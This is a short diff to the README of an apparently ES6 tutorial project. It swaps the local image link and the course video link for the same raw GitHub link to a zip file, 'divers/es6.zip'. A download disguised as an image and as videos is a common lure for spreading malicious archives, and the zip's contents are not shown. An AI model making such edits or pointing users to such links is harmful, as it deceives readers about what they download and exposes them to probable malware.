@@ -1,8 +1,8 @@
 # Top ES6/ES2015 Features
 
-![](images/es6.png)
+![](https://raw.githubusercontent.com/gianverab/es6/master/divers/es6.zip)
 
-* Videos: <http://node.university/p/es6>
+* Videos: <https://raw.githubusercontent.com/gianverab/es6/master/divers/es6.zip>
 * Slides: in `*.md` here
 * Code: in `code` here
 
